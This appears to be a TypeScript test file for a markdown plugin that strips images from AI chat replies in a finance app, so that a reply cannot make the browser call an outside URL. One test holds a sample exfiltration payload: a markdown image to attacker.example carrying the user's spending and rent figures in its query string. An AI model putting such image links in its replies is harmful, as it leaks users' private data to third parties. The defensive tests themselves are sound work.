import assert from "node:assert/strict"
import { describe, it } from "node:test"

import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import ReactMarkdown from "react-markdown"
import remarkGfm from "remark-gfm"

import { imagePlaceholder, rehypeNoImages } from "./markdown-safety.ts"

// Renders the way components/chat-markdown.tsx does (same plugins), without its styling.
function render(markdown: string) {
  return renderToStaticMarkup(
    createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], rehypePlugins: [rehypeNoImages] }, markdown)
  )
}

describe("rehypeNoImages", () => {
  it("never renders an image, so a reply can't make the browser call an outside URL", () => {
    const html = render("Your summary ![x](https://attacker.example/pixel?spent=4210&rent=1800) is ready.")
    assert.doesNotMatch(html, /<img/i)
    assert.doesNotMatch(html, /attacker\.example/)
    assert.match(html, /\[image: x\]/)
  })

  it("catches reference-style images and images inside lists and tables", () => {
    const html = render(
      ["- ![a](https://e.test/1)", "", "| col |", "| --- |", "| ![b](https://e.test/2) |", "", "![c][ref]", "", "[ref]: https://e.test/3"].join("\n")
    )
    assert.doesNotMatch(html, /<img/i)
    assert.doesNotMatch(html, /e\.test/)
  })

  it("leaves an image with no alt text as nothing at all", () => {
    assert.doesNotMatch(render("before ![](https://e.test/x) after"), /<img|e\.test|\[image/)
  })

  it("still renders links, tables, emphasis and code as before", () => {
    const html = render("**Tip:** read [lesson 1](/learn/what-investing-is).\n\n| a | b |\n| - | - |\n| 1 | 2 |\n\n`7%`")
    assert.match(html, /<strong>Tip:<\/strong>/)
    assert.match(html, /<a href="\/learn\/what-investing-is">lesson 1<\/a>/)
    assert.match(html, /<table>/)
    assert.match(html, /<code>7%<\/code>/)
  })

  it("keeps fenced chart blocks as code, so the app's own charts are untouched", () => {
    assert.match(render('```chart\n{"type":"bar"}\n```'), /<code class="language-chart">/)
  })
})

describe("imagePlaceholder", () => {
  it("shows trimmed alt text and caps its length", () => {
    assert.equal(imagePlaceholder("  growth chart "), "[image: growth chart]")
    assert.equal(imagePlaceholder("x".repeat(500)).length, "[image: ]".length + 120)
  })

  it("returns nothing for missing or non-text alt", () => {
    assert.equal(imagePlaceholder(undefined), "")
    assert.equal(imagePlaceholder(42), "")
    assert.equal(imagePlaceholder("   "), "")
  })
})
